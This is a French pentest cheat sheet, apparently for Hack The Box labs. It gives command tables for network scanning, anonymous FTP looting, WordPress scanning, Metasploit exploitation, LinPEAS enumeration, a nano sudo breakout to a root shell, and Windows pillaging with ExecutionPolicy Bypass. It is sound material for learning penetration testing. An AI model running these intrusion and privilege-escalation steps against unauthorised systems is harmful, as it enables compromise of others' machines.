## Network & Service Scanning

|**Command**|**Description**|
|-|-|
| `nmap -sV -p- 10.129.12.0/24 -oA network-scan` | Scan complet (tous ports) d'un sous-réseau avec détection de version. |
| `sudo nmap -p21,22,443 -sV -sC IP` | Scan ciblé avec scripts par défaut sur des ports précis. |
| `ifconfig tun0` | Récupérer sa propre IP d'attaque (pour LHOST Metasploit). |

----
## FTP (accès anonyme)

|**Command**|**Description**|
|-|-|
| `ftp IP 21` | Se connecter en FTP (user: anonymous / pass: anonymous). |
| `ls -al` | Lister tous les fichiers, y compris cachés, une fois connecté. |
| `get <fichier>` | Télécharger un fichier. |
| `cd .ssh` | Naviguer vers un dossier (ex. clés SSH). |

----
## WordPress

|**Command**|**Description**|
|-|-|
| `wpscan -e p --url https://IP --disable-tls-checks --no-banner --plugins-detection aggressive -t 100` | Scanner une install WordPress (plugins, thème, version). |

----
## Metasploit Framework

|**Command**|**Description**|
|-|-|
| `msfconsole -q` | Lancer Metasploit en mode silencieux. |
| `search <mots-clés>` | Chercher un module/exploit. |
| `use <index ou chemin>` | Sélectionner un module. |
| `options` | Lister les options du module. |
| `set rhosts/rport/ssl/lhost <valeur>` | Configurer les options. |
| `exploit` | Lancer l'exploit. |
| `sysinfo` | (meterpreter) Infos système de la cible. |
| `shell` | (meterpreter) Obtenir un shell système basique. |

----
## SSH

|**Command**|**Description**|
|-|-|
| `chmod 600 id_rsa` | Corriger les permissions d'une clé privée avant usage. |
| `ssh -i id_rsa user@IP` | Connexion par clé privée. |
| `ssh user@IP` | Connexion par mot de passe. |

----
## LinPEAS (énumération Linux)

|**Command**|**Description**|
|-|-|
| `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh` | Télécharger LinPEAS. |
| `scp -i id_rsa ./linpeas.sh user@IP:/home/user` | Transférer le script vers la cible. |
| `bash linpeas.sh -a -N > linpeas_results.txt` | Exécuter toutes les vérifications, sans couleur, sortie dans un fichier. |
| `scp -i id_rsa user@IP:/home/user/linpeas_results.txt ./linpeas_results.txt` | Récupérer les résultats. |

----
## Linux Privilege Escalation

|**Command**|**Description**|
|-|-|
| `sudo -l` | Lister les privilèges sudo de l'utilisateur courant. |
| `sudo /usr/bin/nano fichier` puis `CTRL+R CTRL+X` puis `reset; /bin/bash 1>&0 2>&0` | GTFOBins : breakout root via nano en NOPASSWD. |
| `sudo su` | Devenir root directement (si mot de passe connu). |
| `id` | Vérifier l'utilisateur/les privilèges actuels. |

----
## Windows Pillaging (winpill.ps1 / WinPEAS)

|**Command**|**Description**|
|-|-|
| `Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File C:\winpill.ps1"` | Exécuter le script d'énumération en tant qu'administrateur. |
| `scp user@IP:C:/chemin/fichier ./fichier` | Télécharger un fichier trouvé depuis Windows vers le Pwnbox. |
| `Get-NetFirewallRule \| Where-Object {$_.Enabled -eq "True"} \| Measure-Object` | Compter les règles de firewall activées. |
| `smbclient -L //IP -U user` | Lister les shares SMB (dont ADMIN$, C$...). |
